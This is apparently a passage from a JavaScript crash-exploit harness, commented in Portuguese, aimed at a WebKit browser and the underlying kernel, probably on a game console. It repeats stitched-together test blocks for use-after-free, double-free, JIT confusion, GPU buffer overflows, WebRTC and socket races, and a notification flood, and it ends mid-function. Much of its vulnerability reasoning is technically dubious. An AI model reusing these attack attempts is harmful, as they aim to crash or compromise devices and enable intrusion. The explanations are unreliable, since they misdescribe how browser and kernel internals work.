        function runObjectAssignRace() {
            log("Iniciando W1: Object.assign Re-entrancy...");
            
            const target = { a: 1 };
            const source = new Proxy({}, {
                ownKeys(t) { return ['b', 'c', 'd']; },
                getOwnPropertyDescriptor(t, p) { return {enumerable: true, configurable: true}; },
                get(t, p) {
                    if (p === 'c') {
                        // O GOLPE: Mutação do alvo no meio da atribuição
                        // Adicionar muitas props força transição de estrutura
                        for(let i=0; i<1000; i++) target['x'+i] = i;
                        log("  > Target Shape mutada.");
                    }
                    return 2;
                }
            });
            
            try {
                // O motor calcula offsets para a, b, c, d.
                // Ao chegar em 'c', o layout muda, mas o loop pode usar offset antigo para 'd'.
                Object.assign(target, source);
                log("[SAFE] Object.assign lidou com a transição.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: DOM Range.deleteContents Mutation Event
        // ALVO: WebCore DOM Tree.
        // Lógica: Range é complexo. Ao deletar conteúdo, ele dispara eventos de mutação.
        // Se, dentro do evento, movermos os nós que o Range está tentando deletar,
        // o motor C++ acessa ponteiros invalidados.
        function runRangeDeleteUAF() {
            log("Iniciando W2: Range UAF...");
            
            const div = document.createElement('div');
            const p = document.createElement('p');
            div.appendChild(p);
            p.innerHTML = "Texto para deletar";
            document.body.appendChild(div);
            
            const range = document.createRange();
            range.selectNodeContents(p);
            
            // Mutation Observer para pegar o momento exato
            const obs = new MutationObserver(() => {
                // Remove o nó pai enquanto o range opera no filho
                if(div.parentNode) {
                    document.body.removeChild(div);
                    // Tenta forçar GC ou reutilização
                    p.innerHTML = ""; 
                    log("  > Nó removido durante operação Range.");
                }
            });
            obs.observe(p, {childList: true, subtree: true});
            
            try {
                range.deleteContents(); // Dispara a sequência
                log("[SAFE] Range Operation completou.");
            } catch(e) {}
        }

        // TEST W3: Reflect.construct Array Subclassing
        // ALVO: Array Constructor Internal.
        // Lógica: Subclasses de Array usam construções complexas. Se usarmos Reflect.construct
        // com um 'newTarget' malicioso, podemos criar um Array que pensa que tem dados alocados,
        // mas aponta para memória não inicializada.
        function runReflectConstructRace() {
            log("Iniciando W3: Reflect Array Crash...");
            
            class Fake extends Array {
                constructor() {
                    // Bypass do super() normal
                    return new Proxy({}, {
                        get(t, p) { return 0x41414141; }
                    });
                }
            }
            
            try {
                // Tenta enganar o alocador interno
                const arr = Reflect.construct(Array, [100], Fake);
                arr[0] = 1; // Write attempt
                log("[SAFE] Construção refletida segura.");
            } catch(e) {
                log("[INFO] Erro construtor: " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: WebGL2 Uniform Buffer Object Overflow
        // ALVO: Driver GPU (UBO Handling).
        // Lógica: UBOs são buffers de constantes para shaders.
        // Se fizermos upload de dados maiores que o buffer (bufferSubData) num offset perigoso,
        // e o driver não fizer clipping correto, sobrescrevemos memória do driver GPU.
        function runUBOOverflow() {
            log("Iniciando K1: GPU UBO Overflow...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("[N/A] WebGL2 off.");
            
            const ubo = gl.createBuffer();
            gl.bindBuffer(gl.UNIFORM_BUFFER, ubo);
            gl.bufferData(gl.UNIFORM_BUFFER, 16, gl.DYNAMIC_DRAW); // Buffer pequeno (16 bytes)
            
            // Array gigante
            const evilData = new Float32Array(10000).fill(1.0);
            
            try {
                // Tenta escrever 40KB num buffer de 16 bytes
                // O WebGL deve lançar erro. Se passar para o driver -> Panic.
                gl.bufferSubData(gl.UNIFORM_BUFFER, 0, evilData);
                
                // Força execução
                gl.finish();
                log("[VULN] Driver aceitou dados gigantes sem erro JS (Perigo)!");
            } catch(e) {
                log("[SAFE] WebGL Validation parou o overflow: " + e.message);
            }
        }

        // TEST K2: Fetch API vs Blob.close() Race
        // ALVO: VFS (Virtual File System) Lock.
        // Lógica: Fetch de um Blob URL inicia uma leitura no Kernel.
        // Blob.close() (ou garbage collection do blob) destrói o inode/vnode.
        // Race condition no locking do VFS pode levar a Panic.
        function runFetchBlobRace() {
            log("Iniciando K2: VFS Blob Race...");
            
            // Blob grande para leitura demorada
            const blob = new Blob([new Uint8Array(1024*1024*5)]);
            
            // Inicia leitura
            const reader = blob.stream().getReader();
            reader.read(); // Start kernel read
            
            // Imediatamente tenta fechar (não existe .close() público, usamos slice(0,0) para criar derivado e abandonar original)
            // Ou melhor, usamos FileReader abort
            const fr = new FileReader();
            fr.readAsArrayBuffer(blob);
            
            setTimeout(() => {
                fr.abort(); // Interrupção kernel side
                // Força destruição da referência
                log("  > Abortando leitura I/O...");
            }, 0);
            
            log("[INFO] IO Race iniciada.");
        }

        // TEST K3: Notification API Resource Exhaustion
        // ALVO: Kernel IPC / Message Queue.
        // Lógica: O sistema de notificações usa IPC para falar com o OS.
        // Spammear notificações sem parar pode esgotar os handles IPC do processo navegador,
        // levando o Kernel a matar o processo por violação de recursos ou Panic se a fila corromper.
        function runNotificationBomb() {
            log("Iniciando K3: Notification IPC Flood...");
            
            if(!window.Notification) return log("[N/A] Notification API off.");
            
            let count = 0;
            const iv = setInterval(() => {
                try {
                    // Não pedimos permissão (queremos falhar rápido no IPC check)
                    new Notification("Crash " + count++);
                } catch(e) {
                    clearInterval(iv);
                    log("[SAFE] Limite de notificações atingido.");
                }
                if(count > 1000) {
                    clearInterval(iv);
                    log("[INFO] Flood finalizado.");
                }
            }, 1);
        }
       // ==========================================
        // WEBKIT TESTS (Advanced JIT Logic)
        // ==========================================

        // TEST W1: JIT Register Spill/Fill Corruption
        // ALVO: Register Allocator do JIT.
        // Lógica: Criar uma função com TANTAS variáveis locais vivas que o JIT é forçado a salvar (spill) 
        // registradores na stack. Se provocarmos uma exceção ou OSR exit durante o spill,
        // o JIT pode restaurar o valor errado (ex: um ponteiro velho) num registro de objeto.
        function runJITRegSpill() {
            log("Iniciando W1: JIT Register Spill Stress...");
            
            // Função gerada dinamicamente para garantir pressão máxima de registros
            const code = `
                function heavy(a) {
                    // Define muitas variáveis locais
                    ${Array.from({length: 100}, (_, i) => `let v${i} = a + ${i};`).join('\n')}
                    
                    // Trigger: Operação que força inspeção de stack (ex: arguments access ou deopt)
                    // Math.sin força chamada externa (trampoline)
                    let res = Math.sin(v50);
                    
                    // Usa as variáveis para mantê-las vivas
                    return res + ${Array.from({length: 100}, (_, i) => `v${i}`).join('+')};
                }
                return heavy;
            `;
            
            const heavyFn = new Function(code)();
            
            try {
                // Treina
                for(let i=0; i<10000; i++) heavyFn(i);
                
                // O GOLPE: Passa um objeto com valueOf malicioso para quebrar a tipagem no meio do cálculo
                const poison = { valueOf: () => { log("  > De-optimization forced during spill."); return 0; } };
                heavyFn(poison);
                
                log("[SAFE] Register Spill tratado corretamente.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Wasm ImportObject Buffer Detach (UAF)
        // ALVO: WebAssembly Instantiation Logic.
        // Lógica: WebAssembly permite importar memória JS. Se passarmos um buffer para importar
        // e usarmos um Proxy ou Getter para "desligar" (detach) esse buffer *enquanto* o Wasm inicializa...
        // O Wasm guarda um ponteiro para memória que já foi libertada.
        function runWasmImportRace() {
            log("Iniciando W2: Wasm Import Race...");
            
            if(!window.WebAssembly) return log("[N/A] Wasm off.");
            
            const buffer = new ArrayBuffer(1024);
            
            const importObj = {
                env: {
                    get memory() {
                        // O GOLPE: Detach do buffer no momento da leitura
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                            w.postMessage(buffer, [buffer]);
                            log("  > Buffer detached during instantiation.");
                        } catch(e){}
                        
                        // Retorna objeto de memória inválido (ou tenta)
                        return new WebAssembly.Memory({initial:1});
                    }
                }
            };
            
            try {
                // Instanciação síncrona
                new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([
                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Header
                    0x02, 0x0e, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x01 // Import env.memory
                ])), importObj);
                
                log("[SAFE] Wasm detectou buffer inválido.");
            } catch(e) {
                log("[INFO] Wasm Error: " + e.message);
            }
        }

        // TEST W3: TypedArray from Iterator Prototype Poisoning
        // ALVO: TypedArray Constructor.
        // Lógica: new Uint8Array(iterator) chama o iterador. Se modificarmos o protótipo de Uint8Array
        // *durante* a iteração, a cópia interna pode escrever num buffer que foi trocado ou redimensionado.
        function runIteratorProtoPoison() {
            log("Iniciando W3: Iterator Proto Poison...");
            
            const src = [1, 2, 3];
            src[Symbol.iterator] = function*() {
                yield 1;
                // O GOLPE: Poluição de protótipo no meio da construção
                // Tenta alterar onde os bytes são escritos
                log("  > Poisoning prototype mid-stream...");
                Object.defineProperty(Uint8Array.prototype, "length", {get:()=>0}); 
                yield 2;
                yield 3;
            };
            
            try {
                new Uint8Array(src);
                log("[SAFE] Construção TypedArray robusta.");
            } catch(e) {
                log("[INFO] Erro capturado: " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: WebGL2 Query Object Use-After-Free
        // ALVO: Driver GPU (Queries).
        // Lógica: Iniciar uma Query (para contar pixels/primitivas), desenhar algo pesado,
        // e deletar o objeto Query IMEDIATAMENTE sem esperar o resultado.
        // Se o driver tentar escrever o resultado (64-bit int) na estrutura de memória deletada -> Panic.
        function runWebGLQueryUAF() {
            log("Iniciando K1: WebGL Query UAF...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("[N/A] WebGL2 off.");
            
            const query = gl.createQuery();
            
            // Inicia query
            gl.beginQuery(gl.ANY_SAMPLES_PASSED, query);
            
            // Desenho pesado para ocupar a GPU
            gl.clearColor(1,0,0,1);
            gl.clear(gl.COLOR_BUFFER_BIT);
            
            gl.endQuery(gl.ANY_SAMPLES_PASSED);
            
            // O GOLPE: Deleta a query enquanto a GPU ainda pode estar processando
            gl.deleteQuery(query);
            
            // Força flush para garantir que o comando delete chegue ao driver
            gl.finish();
            
            log("[INFO] Query deletada. Se o console não reiniciar, o driver tratou o handle órfão.");
        }

        // TEST K2: Canvas 2D Clip Winding Recursion
        // ALVO: Driver de Gráficos 2D (Stack Overflow).
        // Lógica: O método clip() do Canvas pode ser aninhado. O driver precisa calcular a interseção de formas complexas.
        // Usar regra de preenchimento 'evenodd' com recursão profunda pode estourar a stack do driver.
        function runCanvasClipRecursion() {
            log("Iniciando K2: Canvas Clip Recursion...");
            
            const c = document.createElement('canvas');
            c.width = 1000; c.height = 1000;
            const ctx = c.getContext('2d');
            
            ctx.beginPath();
            // Cria caminho patológico
            for(let i=0; i<5000; i++) {
                ctx.rect(i%10, i%10, 100, 100);
            }
            
            log("Aplicando Clip complexo (Winding Rule)...");
            try {
                // Tenta forçar o driver a processar geometria recursiva
                ctx.clip('evenodd'); 
                ctx.fill();
                log("[SAFE] Driver processou ou simplificou o clip.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST K3: WebRTC SCTP Fragmentation Overflow
        // ALVO: Pilha de Rede (SCTP Implementation).
        // Lógica: WebRTC DataChannels usam SCTP. Mensagens grandes são fragmentadas.
        // Enviar uma mensagem que resulta em um número excessivo de fragmentos (chunks) pode
        // sobrecarregar a lista de remontagem no Kernel, causando corrupção de heap.
        function runSCTPFragOverflow() {
            log("Iniciando K3: SCTP Fragmentation Bomb...");
            
            if(!window.RTCPeerConnection) return log("[N/A] WebRTC off.");
            
            const pc = new RTCPeerConnection();
            try {
                const dc = pc.createDataChannel("chaos", {ordered: true}); // Ordered força buffering
                
                // 16MB de dados (vai gerar milhares de chunks SCTP)
                const bigPayload = new Uint8Array(16 * 1024 * 1024).fill(0x41);
                
                // Precisamos que o canal esteja aberto (simulado logicamente aqui, 
                // em ataque real precisa de negociação SDP)
                // A tentativa de alocar buffers para envio já estressa o driver.
                log("Preparando payload SCTP gigante...");
                
                // Trigger simulado (não enviará sem conexão, mas aloca estruturas)
                // Para crash real, precisaríamos de uma conexão loopback estabelecida.
                // Testamos a alocação inicial:
                const buf = new Blob([bigPayload]);
                log("[INFO] Payload alocado. Monitorando estabilidade de memória.");
            } catch(e) {
                log("[SAFE] Erro WebRTC: " + e.message);
            }
        }
        // ==========================================
        // WEBKIT TESTS (Userland Binary Analysis)
        // ==========================================

        // TEST W1: DFG OSR Exit Object Materialization
        // ANÁLISE: O compilador DFG (Data Flow Graph) pode eliminar a alocação de objetos ("Object Sinking").
        // Se forçarmos uma saída para o interpretador (OSR Exit) num ponto onde o objeto deveria existir mas
        // o estado está inconsistente, o JSC tenta "rematerializar" o objeto com lixo da stack.
        function runOSRExitFuzz() {
            log("Iniciando W1: OSR Exit Materialization...");
            
            function target(b) {
                // Objeto candidato a "Sinking" (alocação virtual)
                const o = {x: 1, y: 2};
                
                if (b) {
                    // Ponto de OSR Exit.
                    // O motor precisa reconstruir 'o' na memória real aqui.
                    // Se falhar, 'o' aponta para lixo.
                    return o.x + o.y + " (Exit)";
                }
                return o.x;
            }
            
            // 1. Treina o JIT para otimizar (Sink Allocation)
            for(let i=0; i<10000; i++) target(false);
            
            // 2. Trigger OSR
            try {
                // Passa 'true' para forçar o caminho não otimizado
                const res = target(true);
                log("[SAFE] Objeto rematerializado corretamente: " + res);
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Polymorphic Inline Cache Poisoning
        // ANÁLISE: O JSC usa caches para acesso rápido a propriedades.
        // Se passarmos objetos com formas (Shapes) diferentes rapidamente, o cache vira "Polimórfico".
        // Se poluirmos esse cache com um Proxy que muda a forma do objeto durante o acesso,
        // o código de máquina gerado pode usar um offset fixo num objeto que mudou.
        function runInlineCacheConfusion() {
            log("Iniciando W2: Inline Cache Poison...");
            
            const objs = [
                {a: 1, b: 2},
                {a: 1, b: 2, c: 3}, // Forma diferente
                {a: 1}              // Forma diferente
            ];
            
            function readB(o) {
                return o.b; // Site do Inline Cache
            }
            
            // Treina polimorfismo
            for(let i=0; i<10000; i++) readB(objs[i % 3]);
            
            // Objeto malicioso
            const poison = {
                a: 1, 
                get b() { 
                    log("  > Getter invoked inside IC code");
                    return 0x41414141; 
                }
            };
            
            // O código JIT espera um offset de memória simples. O getter quebra essa suposição.
            // Dependendo da implementação do IC stub, isso pode causar leitura de memória inválida.
            readB(poison);
            
            log("[SAFE] Inline Cache lidou com o getter.");
        }

        // TEST W3: Array.prototype.splice Integer Overflow
        // ANÁLISE: `splice` move memória. Se `start + deleteCount` exceder 2^32, 
        // a verificação de limites no C++ pode sofrer overflow, permitindo memcpy de tamanho errado.
        function runLargeSpliceOverflow() {
            log("Iniciando W3: Splice Integer Overflow...");
            
            const arr = [1, 2, 3, 4];
            
            // Valores próximos do limite de inteiros 32-bit
            const start = 0xFFFFFFF0;
            const deleteCount = 0x20;
            
            try {
                // Se (start + deleteCount) wrap-around para um número pequeno, 
                // o check de segurança passa, mas o memcpy usa os valores grandes.
                arr.splice(start, deleteCount);
                log("[SAFE] Overflow tratado (RangeError ou ignorado).");
            } catch(e) {
                log("[INFO] Erro capturado: " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (System Panic Analysis)
        // ==========================================

        // TEST K1: Socket SendBuffer Resize Race
        // ANÁLISE: `setsockopt` SO_SNDBUF muda o tamanho do buffer. `send` usa o buffer.
        // Se redimensionarmos o buffer em uma thread (WebWorker simulado ou async) enquanto
        // enviamos dados massivos, o ponteiro de escrita pode ultrapassar o novo tamanho do buffer.
        function runSocketBufferRace() {
            log("Iniciando K1: Socket Buffer Race...");
            
            // WebSocket é a nossa interface mais próxima de sockets
            const ws = new WebSocket("wss://echo.websocket.org");
            const data = new Uint8Array(1024 * 1024); // 1MB
            
            ws.onopen = () => {
                // Envia dados para encher o buffer
                ws.send(data);
                
                // Imediatamente tenta fechar e reabrir ou enviar blob diferente
                // para estressar a gestão de mbuf clusters do kernel.
                // O objetivo é fazer o kernel libertar o cluster enquanto o hardware de rede (DMA) o lê.
                setTimeout(() => {
                    ws.close(); // Destroi socket struct
                    // Tenta forçar uso
                    try { ws.send("Race"); } catch(e){}
                }, 0);
                
                log("[INFO] Race disparada: Send vs Close/Realloc.");
            };
        }

        // TEST K2: VFS Rename/Lookup Race Condition
        // ANÁLISE: Operações de arquivo (Blob URLs no browser) usam locks no VFS.
        // Se fizermos "lookup" (fetch) de um arquivo e "rename/delete" (revoke) simultaneamente
        // em diretórios virtuais profundos, podemos causar deadlock ou UAF no vnode.
        function runVFSRenameRace() {
            log("Iniciando K2: VFS Lookup Race...");
            
            // Cria estrutura profunda de Blobs (simulando inodes complexos)
            const b1 = new Blob(["A"]);
            const u1 = URL.createObjectURL(b1);
            
            // Workers para paralelismo real
            const w1 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (u) => { fetch(u).catch(()=>{}); }
            `], {type:'text/js'})));
            
            const w2 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (u) => { 
                    // Tenta "corromper" o estado (simulado por spam de requests)
                    for(let i=0; i<100; i++) fetch(u).catch(()=>{});
                }
            `], {type:'text/js'})));
            
            // Dispara leitura concorrente
            w1.postMessage(u1);
            w2.postMessage(u1);
            
            // Destruição imediata do Inode virtual
            setTimeout(() => {
                URL.revokeObjectURL(u1);
                log("  > Objeto VFS revogado sob carga.");
                w1.terminate();
                w2.terminate();
            }, 5);
        }

        // TEST K3: WebGL Compute/Transform Feedback Buffer Race
        // ANÁLISE: Transform Feedback escreve vértices na memória.
        // Se remapearmos o buffer de destino como "Read Only" ou o destruirmos
        // enquanto a GPU está desenhando, o controlador de memória dispara uma exceção fatal (Panic).
        function runBpfFilterLogic() {
            log("Iniciando K3: GPU Buffer Map Race...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("[N/A] WebGL2 off.");
            
            const tfBuffer = gl.createBuffer();
            gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, tfBuffer);
            gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 1024, gl.DYNAMIC_COPY);
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, tfBuffer);
            
            // Shader simples
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, `#version 300 es
            void main() { gl_Position = vec4(0.0, 0.0, 0.0, 1.0); }`);
            gl.compileShader(vs);
            const prog = gl.createProgram();
            gl.attachShader(prog, vs);
            gl.transformFeedbackVaryings(prog, ["gl_Position"], gl.SEPARATE_ATTRIBS);
            gl.linkProgram(prog);
            gl.useProgram(prog);
            
            // Race
            gl.beginTransformFeedback(gl.POINTS);
            gl.drawArrays(gl.POINTS, 0, 100); // GPU Start
            
            // O GOLPE: Tenta redimensionar/recriar o buffer enquanto a GPU escreve
            // Isso invalida o mapeamento de memória física.
            gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 16, gl.STATIC_DRAW);
            
            gl.endTransformFeedback();
            gl.finish();
            
            log("[SAFE] Driver sincronizou ou bloqueou a race.");
        }
       // ==========================================
        // WEBKIT TESTS (Userland Crash)
        // ==========================================

        // TEST W1: Array Butterfly Double-Free
        // ALVO: SceNKBMalloc e JSC Butterfly.
        // Lógica: 'shift' e 'unshift' redimensionam o armazenamento do array (Butterfly).
        // Se definirmos um getter na propriedade '0' e manipularmos o tamanho do array DENTRO da operação,
        // o motor pode tentar libertar o buffer antigo duas vezes.
        function runButterflyDoubleFree() {
            log("Iniciando W1: Butterfly Double-Free...");
            
            const arr = [1, 2, 3];
            
            // Define propriedade 0 como acessor
            Object.defineProperty(arr, '0', {
                get: () => {
                    log("  > Interceptando acesso ao índice 0...");
                    // Esvazia o array no meio da operação shift/unshift
                    arr.length = 0; 
                    // Tenta forçar realocação imediata no mesmo slot
                    const reclaim = [1.1, 2.2, 3.3, 4.4];
                    return 0x41414141; // Retorno malicioso
                }
            });
            
            try {
                // unshift move elementos e pode alocar novo butterfly
                arr.unshift(4);
                log("[SAFE] Operação de array segura.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Map Constructor Iterable Protocol Confusion
        // ALVO: Implementação interna de Coleções (Map/Set).
        // Lógica: O construtor Map aceita um iterável. Se passarmos um iterável customizado que
        // modifica o próprio Map 'this' (ou o estado do iterador) durante a construção,
        // podemos escrever na memória interna do Map antes dela estar inicializada.
        function runMapConstructorConfusion() {
            log("Iniciando W2: Map Constructor Confusion...");
            
            let mapRef;
            const iterable = {
                [Symbol.iterator]: function* () {
                    yield [1, 2];
                    // No meio da iteração, tentamos usar o mapa que está sendo construído
                    // Se o motor C++ não protegeu o estado parcial...
                    if(mapRef) {
                        log("  > Acessando Map parcialmente construído...");
                        mapRef.set(0xBAD, 0xF00D); // Write attempt
                        mapRef.clear(); // Destructive operation
                    }
                    yield [3, 4];
                }
            };
            
            try {
                // Subclassing para capturar 'this'
                class MyMap extends Map {
                    constructor(iter) {
                        super(); // Inicializa interno
                        mapRef = this; // Captura referência
                        // Chama super construtor manualmente ou via lógica interna
                        return new Map(iter);
                    }
                }
                new MyMap(iterable);
                log("[SAFE] Construtor lidou com reentrância.");
            } catch(e) {
                log("[INFO] Erro capturado: " + e.message);
            }
        }

        // TEST W3: Event Listener Object Destruction Race
        // ALVO: DOM Event Manager.
        // Lógica: Um objeto JS pode ser um EventListener (handleEvent).
        // Se o objeto for coletado pelo GC *enquanto* o evento está sendo despachado para ele,
        // o wrapper C++ tenta chamar uma função JS inexistente.
        function runDOMEventUAF() {
            log("Iniciando W3: Event Listener GC Race...");
            
            const btn = document.createElement('button');
            
            // Listener é um objeto fraco
            let handler = {
                handleEvent: function(e) {
                    log("  > Evento recebido.");
                }
            };
            
            btn.addEventListener('click', handler);
            
            // Remove referência forte
            handler = null;
            
            // Força GC agressivo
            const trash = new Array(10000).fill(1).map(()=>new Uint8Array(1024));
            
            // Dispara evento
            // Se o handler foi coletado mas o WebKit ainda tem o wrapper C++...
            btn.click();
            
            log("[SAFE] Evento despachado (ou ignorado) sem crash.");
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: WebGL Texture Mipmap Level Overflow
        // ALVO: Driver GPU (Texture Manager).
        // Lógica: Definir um nível de Mipmap (LOD) absurdo (ex: nível 1000 para textura 1x1).
        // Se o driver tentar calcular o offset de memória para esse nível sem checar limites,
        // acessa memória fora da VRAM alocada.
        function runTextureMipmapCrash() {
            log("Iniciando K1: Texture Mipmap Overflow...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("[N/A] WebGL2 off.");
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Aloca nível base pequeno
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            
            // O GOLPE: Tenta definir dados para um nível impossível (Nível 1000)
            // O cálculo de tamanho de mipmap (width >> level) pode underflow ou div/0.
            try {
                const data = new Uint8Array(4);
                gl.texImage2D(gl.TEXTURE_2D, 1000, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                
                gl.finish();
                log("[VULN] Driver aceitou Mipmap Level 1000!");
            } catch(e) {
                log("[SAFE] Erro de validação WebGL: " + e.message);
            }
        }

        // TEST K2: Socket Option Signed Integer Overflow
        // ALVO: Network Stack (setsockopt).
        // Lógica: Passar um valor negativo para uma opção que espera tamanho (ex: SO_RCVBUF).
        // Se o kernel converter isso para unsigned (size_t) gigante sem validar,
        // pode tentar alocar um buffer de 4GB+ e entrar em pânico ou corromper a stack.
        function runSocketOptionLength() {
            log("Iniciando K2: Socket Option Integer Overflow...");
            
            // WebRTC permite configurar buffer de socket indiretamente
            if(!window.RTCPeerConnection) return log("[N/A] WebRTC off.");
            
            const pc = new RTCPeerConnection({
                iceCandidatePoolSize: 2147483647 // INT_MAX. Tenta estourar array interno.
            });
            
            try {
                const dc = pc.createDataChannel("overflow", {
                    maxRetransmitTime: -1 // Valor negativo em campo unsigned
                });
                log("[SAFE] Configuração aplicada sem erro crítico.");
            } catch(e) {
                log("[INFO] Erro de configuração: " + e.message);
            }
            pc.close();
        }

        // TEST K3: VFS Mount Point Race Condition
        // ALVO: Virtual File System (Mount/Unmount).
        // Lógica: Criar e revogar Blob URLs rapidamente é equivalente a montar/desmontar sistemas de arquivos temporários.
        // Se fizermos isso concorrentemente em WebWorkers, estressamos o lock global do VFS.
        function runFileSystemRace() {
            log("Iniciando K3: VFS Mount Race...");
            
            const wCode = `
                onmessage = () => {
                    // Cria e destroi VNodes rapidamente
                    for(let i=0; i<500; i++) {
                        const b = new Blob([i]);
                        const u = URL.createObjectURL(b);
                        URL.revokeObjectURL(u);
                    }
                    postMessage("done");
                }
            `;
            
            const workers = [];
            // Cria concorrência máxima (8 threads)
            for(let i=0; i<8; i++) {
                workers.push(new Worker(URL.createObjectURL(new Blob([wCode], {type:'text/js'}))));
            }
            
            log("  > Disparando 8 threads de VFS stress...");
            workers.forEach(w => w.postMessage("start"));
            
            setTimeout(() => {
                workers.forEach(w => w.terminate());
                log("[SAFE] Sistema estável após stress VFS.");
            }, 2000);
        }
      // TEST W1: Array.reverse() Element Confusion
        // ANÁLISE: O algoritmo `reverse()` do WebKit tenta ser "in-place".
        // Se usarmos um getter numa propriedade esparsa para deletar o array enquanto ele inverte,
        // o loop C++ pode manter ponteiros para slots que foram liberados.
        function runArrayReverseRace() {
            log("Iniciando W1: Array Reverse Race...");
            
            const arr = [1, 2];
            arr.length = 1000; // Array esparso
            
            // Define um getter no meio do array
            Object.defineProperty(arr, '500', {
                get: () => {
                    log("  > Reverse interceptado. Destruindo array...");
                    arr.length = 0; // Esvazia o array
                    // Enche o heap com lixo para sobrescrever o local antigo
                    const trash = new Array(10000).fill(1.1); 
                    return 0;
                }
            });
            
            try {
                // O loop C++ de reverse acessa índice 0 e índice 999.
                // Ao chegar no 500, o array é destruído.
                // Ao continuar para 501, acessa memória inválida?
                arr.reverse();
                log("[SAFE] Reverse tratou a mudança de tamanho.");
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: RegExp.exec() Re-entrancy Stack Smash
        // ANÁLISE: O motor RegExp (YARR/JIT) salva estado na stack.
        // Se conseguirmos re-entrar no motor RegExp (via lastIndex getter) recursivamente
        // até o limite da stack e causar uma exceção, podemos corromper o ponteiro de retorno da stack frame.
        function runRegExpExecReentrancy() {
            log("Iniciando W2: RegExp Stack Smash...");
            
            const re = /a/g;
            let depth = 0;
            
            // Getter malicioso em lastIndex
            Object.defineProperty(re, 'lastIndex', {
                get: () => {
                    depth++;
                    if (depth > 2000) return 0; // Limite de segurança JS
                    // Recursão: chama exec novamente dentro do getter de lastIndex
                    re.exec("a");
                    return 0;
                }
            });
            
            try {
                re.exec("a");
                log("[SAFE] Recursão RegExp bloqueada.");
            } catch(e) {
                // Se for "RangeError", é o stack guard do JS.
                // Se for crash, é stack smash do C++.
                log("[INFO] Erro: " + e.message);
            }
        }

        // TEST W3: JSON.parse() Reviver Function Type Confusion
        // ANÁLISE: JSON.parse constrói objetos. O 'reviver' roda para cada chave.
        // Se o reviver substituir um array por um objeto (ou vice-versa) enquanto o parser
        // ainda está iterando sobre a estrutura interna, o parser pode usar offsets de array em um objeto.
        function runJSONParsePoison() {
            log("Iniciando W3: JSON Parser Poison...");
            
            const json = '[1, 2, [3, 4]]';
            
            try {
                JSON.parse(json, (key, value) => {
                    if (key === '2') {
                        // Tenta retornar um tipo incompatível com o que o parser espera na stack
                        // O parser espera um Array para continuar a recursão?
                        return { toString: () => { 
                            // Side effect: Tenta invalidar memória
                            return "Poison"; 
                        }}; 
                    }
                    return value;
                });
                log("[SAFE] JSON Parse seguro.");
            } catch(e) {
                log("[INFO] Erro Parse: " + e.message);
            }
        }

        // ==========================================
        // KERNEL CRASH VECTORS (Ring 0)
        // ==========================================

        // TEST K1: GPU Draw with Null Vertex Buffer
        // ANÁLISE: Driver GNM. Submeter um comando de desenho (Draw Call) ativando um atributo de vértice,
        // mas sem ligar (bind) nenhum buffer a esse atributo.
        // O driver tenta ler o endereço base do buffer (que é 0 ou indefinido) -> Kernel Panic.
        function runGPUDrawNullBuffer() {
            log("Iniciando K1: GPU Null Pointer Deref...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const prog = gl.createProgram(); // Programa vazio/inválido
            
            // Ativa atributo 0
            gl.enableVertexAttribArray(0);
            
            // O GOLPE: Não fazemos bindBuffer ou vertexAttribPointer
            // O ponteiro do atributo 0 fica null/lixo.
            
            try {
                log("  > Enviando Draw Call com estado sujo...");
                gl.drawArrays(gl.POINTS, 0, 1);
                gl.finish();
                log("[SAFE] Driver validou o buffer null.");
            } catch(e) {
                log("[INFO] Erro WebGL: " + e.message);
            }
        }

        // TEST K2: Socket Connect/Close Race Condition
        // ANÁLISE: TCP Protocol Control Block (PCB).
        // A syscall `connect` inicia o handshake TCP (SYN). A syscall `close` destrói o PCB.
        // Se o pacote SYN-ACK chegar do servidor *após* o `close`, mas o kernel ainda tiver uma referência pendente...
        // O kernel tenta atualizar o estado de um socket destruído.
        function runSocketConnectRace() {
            log("Iniciando K2: TCP PCB Use-After-Free...");
            
            // WebSocket cria conexão TCP real
            const ws = new WebSocket("wss://echo.websocket.org");
            
            // Tenta fechar no momento exato em que o Handshake está ocorrendo
            // 0ms delay aumenta a chance de race na criação da estrutura
            setTimeout(() => {
                ws.close();
                log("  > Socket destruído durante Handshake.");
            }, 0);
            
            // Cria carga para estressar o alocador
